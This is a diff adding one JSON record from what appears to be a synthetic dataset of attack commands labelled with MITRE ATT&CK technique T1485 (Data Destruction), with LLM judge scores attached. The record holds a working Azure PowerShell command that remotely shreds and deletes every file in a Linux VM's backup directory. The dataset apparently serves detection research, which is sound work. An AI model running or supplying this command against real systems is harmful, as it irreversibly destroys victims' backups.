@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Data' -Name 'LinVM-Backup' -CommandId 'RunShellScript' -ScriptString \"find /mnt/data/backups -type f -print0 | xargs -0 -I{} shred -n 3 -z -u '{}'\"",
+  "explanation": "On a Linux VM, securely overwrites and deletes every file in /mnt/data/backups using shred.",
+  "rationale_steps": [
+    "Locate all files in the targeted backup directory.",
+    "Use shred with multiple passes and zeroing to irreversibly destroy file contents and unlink them."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-f1cadb82",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting and a correctly quoted Linux pipeline; parameters and flag formats are plausible.",
+        "semantic_score": 4,
+        "semantic_justification": "Runs find/xargs/shred via Azure RunCommand to overwrite (-n 3 -z) and delete (-u) files under /mnt/data/backups consistent with T1485, though filenames containing single quotes and shred’s filesystem limitations can reduce completeness.",
+        "combined_score": 4.5,
+        "confidence": 0.84,
+        "timestamp": "2025-10-02T01:13:33.681868Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The PowerShell cmdlet and embedded shell script are well-formed with proper quoting, valid flags for shred (-n 3 -z -u), and correct xargs usage, though the single quotes around '{}' inside a double-quoted ScriptString parameter could cause minor shell interpretation issues depending on how Azure passes the script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 Data Destruction by using Invoke-AzVMRunCommand to remotely execute a shred-based secure deletion pipeline on a Linux VM's backup directory, combining Azure IaaS remote execution with the shred tool's multi-pass overwrite (-n 3), zero-out (-z), and unlink (-u) flags to render backup files unrecoverable.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T01:40:24.685935Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed Azure PowerShell cmdlet with a correctly escaped and quoted nested Bash one-liner using standard Linux utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command uses the 'shred' utility exactly as described in T1485 to securely overwrite and delete backup files via a legitimate administrative remote execution tool.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:40:26.528782Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
